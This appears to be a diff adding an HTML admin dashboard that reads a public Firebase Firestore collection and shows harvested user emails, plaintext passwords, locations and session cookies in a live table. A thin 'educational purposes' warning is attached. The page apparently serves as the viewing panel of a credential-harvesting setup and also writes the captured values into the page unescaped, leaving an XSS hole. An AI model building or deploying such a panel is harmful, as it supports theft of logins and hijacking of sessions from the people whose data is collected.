@@ -1,0 +1,214 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Admin Dashboard - User Credentials (Firebase)</title>
+    <!-- Tailwind CSS CDN -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: #f0f2f5;
+            min-height: 100vh;
+            margin: 0;
+            padding: 2rem;
+            box-sizing: border-box;
+        }
+        .container {
+            max-width: 900px;
+            margin: 0 auto;
+        }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+        }
+        th, td {
+            border: 1px solid #e2e8f0;
+            padding: 12px;
+            text-align: left;
+        }
+        th {
+            background-color: #f8faff;
+            font-weight: 600;
+        }
+        tr:nth-child(even) {
+            background-color: #fdfdfe;
+        }
+        .info-box {
+            background-color: #e6f7ff;
+            border-color: #91d5ff;
+            color: #0050b3;
+            padding: 1rem;
+            border-radius: 0.375rem;
+            margin-bottom: 1.5rem;
+            font-size: 0.9rem;
+            line-height: 1.5;
+        }
+        .warning-box {
+            background-color: #fff3cd;
+            border-color: #ffeeba;
+            color: #856404;
+            padding: 1rem;
+            border-radius: 0.375rem;
+            margin-bottom: 1.5rem;
+            font-size: 0.9rem;
+            line-height: 1.5;
+        }
+    </style>
+</head>
+<body>
+    <div class="container bg-white p-8 rounded-lg shadow-md border border-gray-200">
+        <h1 class="text-3xl font-bold text-center mb-6 text-gray-800">Admin Dashboard</h1>
+        <p class="text-lg text-gray-600 text-center mb-8">User Credentials Log</p>
+
+        <div class="warning-box">
+            <strong>Security Warning:</strong> This page demonstrates storing user credentials, location, and cookies for educational purposes using Firebase. In a real application, storing passwords in plain text is a severe security risk and should NEVER be done. Geolocation also requires user permission.
+        </div>
+
+        <div class="info-box">
+            <strong>Note:</strong> This version connects to Firebase Firestore. Data will be stored centrally and visible to all connected clients.
+        </div>
+
+        <div class="mb-4 text-gray-700">
+            <p><strong>Current User ID:</strong> <span id="currentUserId">Loading...</span></p>
+            <p class="text-sm text-gray-500">This ID is used for Firestore access.</p>
+        </div>
+
+        <div class="overflow-x-auto rounded-lg shadow-sm border border-gray-200">
+            <table class="min-w-full bg-white">
+                <thead>
+                    <tr>
+                        <th class="px-6 py-3 text-xs font-medium text-gray-500 uppercase tracking-wider">Email</th>
+                        <th class="px-6 py-3 text-xs font-medium text-gray-500 uppercase tracking-wider">Password</th>
+                        <th class="px-6 py-3 text-xs font-medium text-gray-500 uppercase tracking-wider">Timestamp</th>
+                        <th class="px-6 py-3 text-xs font-medium text-gray-500 uppercase tracking-wider">Location</th>
+                        <th class="px-6 py-3 text-xs font-medium text-gray-500 uppercase tracking-wider">Cookies</th>
+                    </tr>
+                </thead>
+                <tbody id="credentialsTableBody" class="divide-y divide-gray-200">
+                    <!-- Data will be loaded here by JavaScript -->
+                    <tr>
+                        <td colspan="5" class="text-center py-4 text-gray-500">Loading user data from Firebase...</td>
+                    </tr>
+                </tbody>
+            </table>
+        </div>
+    </div>
+
+    <script type="module">
+        // Firebase SDK imports
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-app.js";
+        import { getAuth, signInAnonymously, signInWithCustomToken, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-auth.js";
+        import { getFirestore, collection, onSnapshot, query } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-firestore.js";
+
+        // Firebase configuration and initialization
+        // IMPORTANT: For local testing, you MUST replace these placeholders with your actual Firebase project credentials.
+        // In a real application, NEVER hardcode sensitive information like this.
+        const appId = typeof __app_id !== 'undefined' ? __app_id : 'default-app-id'; // Use Canvas provided ID or a local placeholder
+        const firebaseConfig = JSON.parse(typeof __firebase_config !== 'undefined' ? __firebase_config : `{
+            "apiKey": "YOUR_ACTUAL_FIREBASE_API_KEY_HERE",
+            "authDomain": "YOUR_PROJECT_ID.firebaseapp.com",
+            "projectId": "YOUR_PROJECT_ID",
+            "storageBucket": "YOUR_PROJECT_ID.appspot.com",
+            "messagingSenderId": "YOUR_MESSAGING_SENDER_ID",
+            "appId": "YOUR_APP_ID"
+        }`);
+
+        let app;
+        let auth;
+        let db;
+        let userId;
+        let isAuthReady = false;
+
+        // Initialize Firebase and set up auth listener
+        async function initializeFirebase() {
+            try {
+                app = initializeApp(firebaseConfig);
+                auth = getAuth(app);
+                db = getFirestore(app);
+
+                onAuthStateChanged(auth, async (user) => {
+                    if (user) {
+                        userId = user.uid;
+                        document.getElementById('currentUserId').textContent = userId;
+                        isAuthReady = true;
+                        console.log("Firebase authenticated. User ID:", userId);
+                        // Start listening for data only after auth is ready
+                        listenForCredentials();
+                    } else {
+                        // Attempt anonymous sign-in if no user is found
+                        try {
+                            if (typeof __initial_auth_token !== 'undefined' && __initial_auth_token) {
+                                await signInWithCustomToken(auth, __initial_auth_token);
+                            } else {
+                                await signInAnonymously(auth);
+                            }
+                            // onAuthStateChanged will be triggered again with the new user
+                        } catch (anonError) {
+                            console.error("Error signing in anonymously:", anonError);
+                            document.getElementById('currentUserId').textContent = 'Authentication failed. Check console.';
+                        }
+                    }
+                });
+            } catch (error) {
+                console.error("Error initializing Firebase:", error);
+                document.getElementById('currentUserId').textContent = 'Error initializing Firebase. Please check your Firebase config (API Key/Project ID) in the code and console for details.';
+            }
+        }
+
+        // Function to listen for real-time updates to credentials from Firestore
+        function listenForCredentials() {
+            if (!db || !isAuthReady) {
+                console.log("Firestore or Auth not ready, retrying listenForCredentials...");
+                setTimeout(listenForCredentials, 500); // Retry after a short delay
+                return;
+            }
+
+            // Path to the public collection where credentials are stored
+            const credentialsCollectionRef = collection(db, `artifacts/${appId}/public/data/user_credentials`);
+            
+            // Query to listen for all documents in the collection
+            // Note: orderBy is commented out as per previous instructions to avoid potential index issues.
+            const q = query(credentialsCollectionRef); // , orderBy("timestamp", "desc")
+
+            onSnapshot(q, (snapshot) => {
+                const credentialsTableBody = document.getElementById('credentialsTableBody');
+                credentialsTableBody.innerHTML = ''; // Clear existing rows
+
+                if (snapshot.empty) {
+                    credentialsTableBody.innerHTML = `<tr><td colspan="5" class="text-center py-4 text-gray-500">No user credentials found in Firebase.</td></tr>`;
+                    return;
+                }
+
+                const credentials = [];
+                snapshot.forEach((doc) => {
+                    credentials.push({ id: doc.id, ...doc.data() });
+                });
+
+                // Sort credentials by timestamp (newest first) client-side
+                credentials.sort((a, b) => (b.timestamp?.toDate() || 0) - (a.timestamp?.toDate() || 0));
+
+                credentials.forEach((data) => {
+                    const row = document.createElement('tr');
+                    row.innerHTML = `
+                        <td class="px-6 py-4 whitespace-nowrap text-sm font-medium text-gray-900">${data.email || 'N/A'}</td>
+                        <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-500">${data.password || 'N/A'}</td>
+                        <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-500">${data.timestamp ? new Date(data.timestamp.toDate()).toLocaleString() : 'N/A'}</td>
+                        <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-500">${data.location || 'N/A'}</td>
+                        <td class="px-6 py-4 text-sm text-gray-500 break-all">${data.cookies || 'N/A'}</td>
+                    `;
+                    credentialsTableBody.appendChild(row);
+                });
+            }, (error) => {
+                console.error("Error listening to credentials from Firebase:", error);
+                document.getElementById('credentialsTableBody').innerHTML = `<tr><td colspan="5" class="text-center py-4 text-red-500">Error loading data from Firebase. Check console for details.</td></tr>`;
+            });
+        }
+
+        // Call Firebase initialization on window load
+        window.onload = initializeFirebase;
+    </script>
+</body>
+</html>
